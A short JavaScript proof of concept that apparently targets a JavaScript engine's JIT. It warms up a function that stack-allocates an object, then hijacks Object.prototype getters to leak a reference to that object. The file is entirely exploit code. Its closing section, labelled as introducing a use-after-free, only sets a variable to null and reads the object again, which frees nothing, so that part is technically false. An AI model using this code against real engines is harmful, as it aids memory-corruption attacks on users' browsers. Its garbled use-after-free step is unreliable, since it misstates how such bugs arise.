function opt() {
    let o = {};  // stack-allocated object
    o.x;  // under with DisableImplicitFlags set
}

function main() {
    for (let i = 0; i < 10000; i++) {
        opt();
    }

    let leaked_stack_object = null;
    let object_prototype = ({}).__proto__;
    object_prototype.__defineGetter__('x', Error.prototype.toString);
    object_prototype.__defineGetter__('message', function () {
        delete object_prototype.message;

        leaked_stack_object = this;
    });

    object_prototype.name = Array.prototype;  // access to Array.prototype will call JsBuiltInEngineInterfaceExtensionObject::InjectJsBuiltInLibraryCode.

    opt();

    // Introducing Use After Free vulnerability
    let freed_object = object_prototype;
    object_prototype = null;

    // Accessing the freed object
    alert(freed_object.x);

    alert(leaked_stack_object);
}

main();
